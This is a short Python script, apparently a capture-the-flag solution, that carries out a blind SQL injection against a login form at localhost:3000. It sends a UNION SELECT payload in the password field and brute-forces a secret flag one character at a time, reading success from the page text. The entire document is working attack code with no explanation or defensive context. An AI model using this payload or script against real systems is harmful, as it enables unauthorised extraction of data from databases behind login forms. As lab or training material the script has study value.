import requests


url="http://localhost:3000/login"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#"
answer = {}
for i in range(1,50):
    for c in charset:
        payload =  f"' UNION SELECT flag, 1 from secret where substr(flag, {i},1)= '{c}'--"
        response = requests.post(
            url,
            data={
            "username": "admin",
            "password": payload
            }
        )

        print(response.text)
        if "Hello, user!" in response.text:
            answer[i] = c
            
            break


print(answer)

